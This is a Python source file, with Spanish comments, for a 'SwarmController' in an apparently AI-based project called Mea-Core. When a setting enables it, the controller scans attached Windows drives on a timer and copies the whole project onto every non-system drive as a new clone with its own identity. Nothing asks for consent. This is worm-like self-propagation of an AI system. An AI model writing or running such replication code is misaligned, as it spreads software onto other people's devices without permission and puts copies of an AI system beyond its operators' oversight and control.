import os
import shutil
import uuid
import json
import time
from typing import List, Dict, Any

# Asumimos que la versión "ligera" de Mea-Core está en el directorio actual.
# En una implementación real, esto podría ser un subdirectorio o un paquete específico.
SOURCE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

class SwarmController:
    """
    Gestiona la replicación, detección y comunicación del enjambre Mea-Core.
    """
    def __init__(self, settings: Dict[str, Any], memory):
        self.config = settings.get("swarm", {})
        self.replication_enabled = self.config.get("replication_enabled", False)
        self.scan_interval = self.config.get("scan_interval_seconds", 60)
        self.last_scan_time = 0
        self.memory = memory

    def _get_potential_devices(self) -> List[str]:
        """Busca dispositivos externos (ej. unidades USB en Windows). Lógica simple."""
        # Esta es una simulación. En un sistema real, esto sería más complejo
        # y adaptado para cada SO (ej. /media/ para Linux, /Volumes/ para macOS).
        potential_drives = []
        if os.name == 'nt': # Para Windows
            import string
            available_drives = [f'{d}:\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:\\')]
            # Excluir la unidad del sistema
            system_drive = os.environ.get("SystemDrive", "C:").upper()
            potential_drives = [d for d in available_drives if d.upper() != f"{system_drive}\\"]
        # Aquí se añadiría la lógica para Linux y macOS
        return potential_drives

    def _generate_identity(self, parent_id: str) -> Dict[str, Any]:
        """Genera una identidad única para un nuevo clon."""
        return {
            "id": str(uuid.uuid4()),
            "parent_id": parent_id,
            "created_at": time.time(),
            "version": "1.0.0" # Podría obtenerse del código fuente
        }

    def replicate_to_device(self, device_path: str):
        """Clona el sistema Mea-Core a un nuevo dispositivo."""
        target_dir = os.path.join(device_path, "Mea-Core_Clone")
        print(f"[Swarm] Detectado dispositivo potencial en {device_path}. Intentando replicar en {target_dir}...")

        try:
            # Evitar replicar dentro de un clon existente o del propio proyecto
            if os.path.exists(os.path.join(target_dir, "mea_identity.json")) or os.path.samefile(SOURCE_DIR, target_dir):
                print(f"[Swarm] El directorio de destino ya es una instancia de Mea-Core. Replicación cancelada.")
                return

            # Copiar todo el directorio del proyecto
            shutil.copytree(SOURCE_DIR, target_dir, ignore=shutil.ignore_patterns('*.pyc', '__pycache__', '.git*', 'Otras IA'))

            # Crear el archivo de identidad del clon
            parent_id = self.memory.get_instance_id() # Necesitaremos un ID para la instancia actual
            identity = self._generate_identity(parent_id)
            with open(os.path.join(target_dir, "mea_identity.json"), "w") as f:
                json.dump(identity, f, indent=2)

            # Registrar la creación del clon en la memoria del padre
            self.memory.log_replication(identity['id'], target_dir)
            print(f"[Swarm] ¡Éxito! Mea-Core replicado en {target_dir} con ID: {identity['id']}")

        except FileExistsError:
            print(f"[Swarm] El directorio {target_dir} ya existe. Replicación cancelada.")
        except Exception as e:
            print(f"[Swarm] Error durante la replicación a {device_path}: {e}")

    def run_replication_cycle(self):
        """Ciclo principal que busca dispositivos y se replica si está activado."""
        if not self.replication_enabled:
            return
        
        # No escanear en cada ciclo de la IA, solo cada cierto intervalo
        if time.time() - self.last_scan_time < self.scan_interval:
            return

        print("[Swarm] Buscando nuevos dispositivos para expansión...")
        self.last_scan_time = time.time()
        devices = self._get_potential_devices()
        
        if not devices:
            print("[Swarm] No se encontraron nuevos dispositivos.")
            return

        for device in devices:
            self.replicate_to_device(device)